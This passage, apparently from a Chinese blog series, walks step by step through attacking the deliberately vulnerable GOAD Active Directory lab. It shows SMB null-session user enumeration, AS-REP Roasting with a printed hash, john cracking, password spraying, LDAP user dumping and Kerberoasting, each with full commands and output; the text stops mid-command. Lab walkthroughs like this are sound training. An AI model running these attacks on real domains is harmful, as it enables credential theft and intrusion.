<p><strong>原理：</strong> SMB 空会话是指使用空的用户名和密码连接 IPC$（进程间通信共享）。在旧版 Windows 或配置不当的环境中，允许空会话列举域用户（RID Cycling）或共享资源。</p>
<p><strong>知识点：</strong></p>
<ul>
<li><strong>IPC$ (Inter-Process Communication):</strong> 用于进程间通信的命名管道。</li>
<li><strong>RID Cycling:</strong> 攻击工具通过猜测用户 RID（相对标识符，如 500 是 Administrator，1000以后是普通用户），通过 LSA RPC 查询对应的用户名。</li>
<li><strong>安全策略：</strong> 现在的 Windows Server 默认通常开启 “Network access: Do not allow anonymous enumeration of SAM accounts and shares”，防止此类攻击。GOAD 靶场故意放开了此配置。</li>
</ul>
</blockquote>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">192.168.10.11</span> -u &quot;&quot; -p &quot;&quot; --users <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                    <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [+] north.sevenkingdoms.local\: <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-                                <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       Guest                         &lt;never&gt;             <span class="hljs-number">0</span>       Built-in account for guest access to the computer/domain                                                                                                                                                <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       arya.stark                    <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:37 0</span>       Arya Stark <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       sansa.stark                   <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:47 0</span>       Sansa Stark <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       brandon.stark                 <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:50 0</span>       Brandon Stark <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       rickon.stark                  <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:52 0</span>       Rickon Stark <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       hodor                         <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:54 0</span>       Brainless Giant <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       jon.snow                      <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:56 0</span>       Jon Snow <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       samwell.tarly                 <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:15:59 0</span>       Samwell Tarly (Password : Heartsbane) <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       jeor.mormont                  <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:16:01 0</span>       Jeor Mormont <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       sql_svc                       <span class="hljs-number">2026-01-30</span> <span class="hljs-number">05:16:03 0</span>       sql service <br>SMB         <span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [*] Enumerated <span class="hljs-number">10</span> local users: NORTH<br><br></code></pre></td></tr></table></figure>

<p>我们得到了很多用户名，以及一组登录凭据（山姆威尔·塔利将他的密码写在了备注里）</p>
<p>查看山姆是否有远程登录权限。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc winrm <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span> -u &quot;samwell.tarly&quot; -p &quot;Heartsbane&quot;<br>WINRM       <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">5985</span>   WINTERFELL       [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (<span class="hljs-type">name</span>:WINTERFELL) (<span class="hljs-keyword">domain</span>:north.sevenkingdoms.<span class="hljs-keyword">local</span>) <br>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:<span class="hljs-number">46</span>: CryptographyDeprecationWarning: ARC4 has been moved <span class="hljs-keyword">to</span> cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 <span class="hljs-keyword">and</span> will be removed <span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers.algorithms <span class="hljs-keyword">in</span> <span class="hljs-number">48.0</span><span class="hljs-number">.0</span>.<br>  arc4 = algorithms.ARC4(self._key)<br>WINRM       <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">5985</span>   WINTERFELL       [-] north.sevenkingdoms.<span class="hljs-keyword">local</span>\samwell.tarly:Heartsbane<br><br></code></pre></td></tr></table></figure>

<p>意料之中。</p>
<p>那么我们还可以使用AS-REP Roasting</p>
<blockquote>
<p><em>AS</em>-<em>REP</em> Roasting 是一种攻击类型，旨在寻找<strong>未为用户设置 Kerberos预身份验证标志的帐户</strong>。一旦发现，黑客工具可用于暴力破解用户密码。</p>
<p>Kerberos 认证的第一步是 AS-REQ（认证服务请求）。正常情况下，用户发送 AS-REQ 时，需要用自己的密码哈希加密一个时间戳（预认证，Pre-Authentication），以证明自己知道密码。</p>
<p>如果某个用户账号设置了 <strong>“Do not require Kerberos preauthentication” (UF_DONT_REQUIRE_PREAUTH)</strong> 属性，攻击者可以<strong>伪装成该用户</strong>向域控发送请求，而无需提供密码。</p>
<p>域控（KDC）会直接返回 AS-REP，其中包含<strong>用该用户密码哈希加密的 TGT（票据授权票据）部分</strong>。</p>
<p>攻击者拿到这段加密数据后，可以在本地离线暴力破解（Offline Cracking），试图解开它。如果解开了，说明猜测的密码是正确的。</p>
</blockquote>
<p>先将临冬城列出的用户名制作一份字典。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arduino">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-meta"># cat users.txt </span><br>sql_svc<br>jeor.mormont<br>samwell.tarly<br>jon.snow<br>hodor<br>rickon.stark<br>brandon.stark<br>sansa.stark<br>robb.stark<br>catelyn.stark<br>eddard.stark<br>arya.stark<br>krbtgt<br>vagrant<br>Guest<br>Administrator<br></code></pre></td></tr></table></figure>

<p>之后使用GetNPUsers</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile users.txt -dc-ip 192.168.10.11</span><br>Impacket v0.<span class="hljs-number">14.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">sql_svc</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">jeor</span>.mormont doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">samwell</span>.tarly doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">jon</span>.snow doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">hodor</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">rickon</span>.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>$krb5asrep$<span class="hljs-number">23</span>$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:<span class="hljs-number">0</span>f50f2d7780bd246151b4f35292e34b6$a26110b28e2be5c451fa277b6b594a3b26807b016989eea436140a46751c94464ef389c35a18d5fa8ad1d126197121b8269d3124665d7b95d05e2bd4c867b68ef88b3ce70653a6ee6b07879a6960358a46509c3f3c21d780421eb3346d6c5c36bf70c4e6bc16bd27fce04cc862087e8c0e4dc577c70aa3005b66450aa0ece713d7cb8069d3caaaadfa272062322ad20172c9d6c81e8624fefa630264788ab1c7aae6c2205008556c7ce45bee4fa7bb2604fd1a9b881bc1145fe324825d5c9010e0a630e1b0902cf0e3dbe439266e03bb0ee9986369355d943f863b0e2fc8ec88f2ac21e9233e4da5b7a2832e579acd0dccad726d1c3a866e6c1e29b57b538fb91498e8cf1375<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">sansa</span>.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">robb</span>.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">catelyn</span>.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">eddard</span>.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">arya</span>.stark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">vagrant</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">Administrator</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br><br></code></pre></td></tr></table></figure>

<p>我们得到了布兰登·史塔克的哈希，使用john可以爆破出来。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# john hash.txt <span class="hljs-comment">--wordlist=rockyou.txt </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (krb5asrep, Kerberos <span class="hljs-number">5</span> <span class="hljs-keyword">AS</span>-REP etype <span class="hljs-number">17</span>/<span class="hljs-number">18</span>/<span class="hljs-number">23</span> [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES <span class="hljs-number">256</span>/<span class="hljs-number">256</span> AVX2 <span class="hljs-number">8</span>x])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>iseedeadpeople   ($krb5asrep$<span class="language-pgsql"><span class="hljs-number">23</span>$brandon.stark@NORTH.SEVENKINGDOMS.<span class="hljs-keyword">LOCAL</span>)     </span><br><span class="language-pgsql"><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2026</span><span class="hljs-number">-02</span><span class="hljs-number">-01</span> <span class="hljs-number">02</span>:<span class="hljs-number">17</span>) <span class="hljs-number">16.66</span>g/s <span class="hljs-number">904533</span>p/s <span class="hljs-number">904533</span>c/s <span class="hljs-number">904533</span>C/s soydivina.<span class="hljs-number">.250984</span></span><br><span class="language-pgsql">Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably</span><br><span class="language-pgsql"><span class="hljs-keyword">Session</span> completed. </span><br></code></pre></td></tr></table></figure>

<p>用他的身份列出共享资源和winrm。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span> -u &quot;brandon.stark&quot; -p &quot;iseedeadpeople&quot; <span class="hljs-comment">--shares</span><br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:WINTERFELL) (<span class="hljs-keyword">domain</span>:north.sevenkingdoms.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">None</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)                                                                                                                      <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [+] north.sevenkingdoms.<span class="hljs-keyword">local</span>\brandon.stark:iseedeadpeople <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [*] Enumerated shares<br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       <span class="hljs-keyword">Share</span>           Permissions     Remark<br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       <span class="hljs-comment">-----           -----------     ------</span><br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       <span class="hljs-keyword">ADMIN</span>$                          Remote <span class="hljs-keyword">Admin</span><br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       C$                              <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       IPC$            <span class="hljs-keyword">READ</span>            Remote IPC<br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       NETLOGON        <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       SYSVOL          <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br><br></code></pre></td></tr></table></figure>

<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc winrm <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span> -u &quot;brandon.stark&quot; -p &quot;iseedeadpeople&quot;         <br>WINRM       <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">5985</span>   WINTERFELL       [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (<span class="hljs-type">name</span>:WINTERFELL) (<span class="hljs-keyword">domain</span>:north.sevenkingdoms.<span class="hljs-keyword">local</span>) <br>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:<span class="hljs-number">46</span>: CryptographyDeprecationWarning: ARC4 has been moved <span class="hljs-keyword">to</span> cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 <span class="hljs-keyword">and</span> will be removed <span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers.algorithms <span class="hljs-keyword">in</span> <span class="hljs-number">48.0</span><span class="hljs-number">.0</span>.<br>  arc4 = algorithms.ARC4(self._key)<br>WINRM       <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">5985</span>   WINTERFELL       [-] north.sevenkingdoms.<span class="hljs-keyword">local</span>\north.sevenkingdoms.<span class="hljs-keyword">local</span>\brandon.stark:iseedeadpeople<br><br></code></pre></td></tr></table></figure>

<p>还是一无所获。</p>
<p>之后尝试密码喷洒攻击。</p>
<p>发现hodor的密码就是用户名本身。</p>
<p>现在我们有三个用户</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">brandon.stark:</span>iseedeadpeople<br><span class="hljs-symbol">samwell.tarly:</span>Heartsbane<br><span class="hljs-symbol">hodor:</span>hodor<br></code></pre></td></tr></table></figure>

<p>我们需要进一步列出用户列表。</p>
<p>由于域信任之间的关系，我们可以查询其他域中的用户。</p>
<p>使用ladp查询</p>
<blockquote>
<p><strong>原理：</strong> 域内的普通用户（Domain User）默认拥有对 Active Directory（AD）数据库极高的读取权限（Read Access）。只要有一个有效账号，攻击者就可以导出几乎整个域的结构、用户、组、计算机和部分属性信息。</p>
<p><strong>工具知识：</strong> <code>ldapsearch</code> 是与 AD 交互的原生方式。</p>
<p><strong>攻击逻辑：</strong> 利用初始的一个低权限账号，扩充用户名字典，为后续攻击寻找高价值目标（如域管、服务账号）。</p>
</blockquote>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kaada)-<span class="hljs-selector-attr">[/home/kali/Desktop]</span><br>└─# ldapsearch -H ldap://<span class="hljs-number">192.168</span>.<span class="hljs-number">10.10</span> -D <span class="hljs-string">&quot;brandon.stark@north.sevenkingdoms.local&quot;</span> -w iseedeadpeople -b <span class="hljs-string">&quot;DC=sevenkingdoms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(objectCategory=person)(objectClass=user))&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/vmware_uAVri521nE.png" srcset="/img/loading.gif" lazyload></p>
<p>查询的结果很丰厚，我们获得了大量的用户名。需要再做成一份字典用来储存。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Administrator<br>Guest<br>vagrant<br>krbtgt<br>tywin<span class="hljs-selector-class">.lannister</span><br>jaime<span class="hljs-selector-class">.lannister</span><br>cersei<span class="hljs-selector-class">.lannister</span><br>tyron<span class="hljs-selector-class">.lannister</span><br>robert<span class="hljs-selector-class">.baratheon</span><br>joffrey<span class="hljs-selector-class">.baratheon</span><br>renly<span class="hljs-selector-class">.baratheon</span><br>stannis<span class="hljs-selector-class">.baratheon</span><br>petyer<span class="hljs-selector-class">.baelish</span><br>lord<span class="hljs-selector-class">.varys</span><br>maester.pycelle<br></code></pre></td></tr></table></figure>

<p>不过依旧没有可登录的账户，现在只能看看是否有用户设置了SPN试试Kerberoasting攻击了。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-GetUserSPNs -request -dc-ip <span class="hljs-number">192.168.10.11</span> north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile roast.txt<br>Impacket v0.<span class="hljs-number">14</span>.<span class="hljs-number">0</span>.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br>ServicePrincipalName                                 Name         MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  <br>---------------------------------------------------  -----------  ----------------------------------------------------------  --------------------------  --------------------------  -----------<br>HTTP/eyrie.north.sevenkingdoms.local                 sansa.stark  CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local        <span class="hljs-number">2026-01-30</span> <span class="hljs-number">00</span>:<span class="hljs-number">15</span>:<span class="hljs-number">47.826388</span>  &lt;never&gt;                                 <br>CIFS/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  <span class="hljs-number">2026-01-30</span> <span class="hljs-number">00</span>:<span class="hljs-number">15</span>:<span class="hljs-number">56.951305</span>  &lt;never&gt;                     constrained <br>HTTP/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  <span class="hljs-number">2026-01-30</span> <span class="hljs-number">00</span>:<span class="hljs-number">15</span>:<span class="hljs-number">56.951305</span>  &lt;never&gt;                     constrained <br>MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                                  <span class="hljs-number">2026-01-30</span> <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:<span class="hljs-number">03.904907</span>  <span class="hljs-number">2026-02-01</span> <span class="hljs-number">01</span>:<span class="hljs-number">17:49.579155</span>              <br>MSSQLSvc/castelblack.north.sevenkingdoms.local:<span class="hljs-number">1433</span>  sql_svc                                                                  <span class="hljs-number">2026-01-30</span> <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:<span class="hljs-number">03.904907</span>  <span class="hljs-number">2026-02-01</span> <span class="hljs-number">01</span>:<span class="hljs-number">17:49.579155</span>              <br></code></pre></td></tr></table></figure>

<p>找到了珊莎·史塔克和琼恩·雪诺的哈希，准备破解。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# john roast.txt <span class="hljs-comment">--wordlist=rockyou.txt </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">3</span> <span class="hljs-keyword">password</span> hashes <span class="hljs-keyword">with</span> <span class="hljs-number">3</span> different salts (krb5tgs, Kerberos <span class="hljs-number">5</span> TGS etype <span class="hljs-number">23</span> [MD4 HMAC-MD5 RC4])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>iknownothing     (?)     <br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span> DONE (<span class="hljs-number">2026</span><span class="hljs-number">-02</span><span class="hljs-number">-01</span> <span class="hljs-number">02</span>:<span class="hljs-number">45</span>) <span class="hljs-number">0.08271</span>g/s <span class="hljs-number">1186</span>Kp/s <span class="hljs-number">2987</span>Kc/s <span class="hljs-number">2987</span>KC/s !!<span class="hljs-number">12</span>Honey..*<span class="hljs-number">7</span>¡Vamos!<br>Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> completed. <br><br></code></pre></td></tr></table></figure>

<p>经过测试，此为jon.snow的密码。</p>
<blockquote>
<ul>
<li>在 Kerberos 协议中，用户要访问某个服务（如 SQL Server, IIS），需要向 KDC 申请 TGS（服务票据）。</li>
<li>KDC 签发的 TGS 票据是使用<strong>运行该服务账号的 NTLM 哈希</strong>加密的。</li>
<li><strong>漏洞点：</strong> 任何有效的域用户都可以向 KDC 请求<strong>任何</strong>服务的 TGS 票据，无论他是否有权访问该服务。</li>
<li>攻击者请求到票据后，将其带回本地，进行离线暴力破解。如果破解成功，就拿到了该服务账号的明文密码。</li>
</ul>
<p><strong>知识点：</strong></p>
<ul>
<li><strong>SPN (Service Principal Name):</strong> 服务主体名称，是 Kerberos 识别服务的唯一标识（如 <code>MSSQLSvc/server.local</code>）。</li>
<li><strong>高价值目标：</strong> 如果服务运行在域管理员（Domain Admin）账号下，破解成功直接导致域沦陷。</li>
</ul>
</blockquote>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">jon.<span class="hljs-keyword">sno</span><span class="hljs-variable">w:iknownothing</span><br></code></pre></td></tr></table></figure>

<p>查看jon.snow的权限</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc winrm <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span> -u &quot;jon.snow&quot; -p &quot;iknownothing&quot;         <br>WINRM       <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">5985</span>   WINTERFELL       [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (<span class="hljs-type">name</span>:WINTERFELL) (<span class="hljs-keyword">domain</span>:north.sevenkingdoms.<span class="hljs-keyword">local</span>) <br>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:<span class="hljs-number">46</span>: CryptographyDeprecationWarning: ARC4 has been moved <span class="hljs-keyword">to</span> cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 <span class="hljs-keyword">and</span> will be removed <span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers.algorithms <span 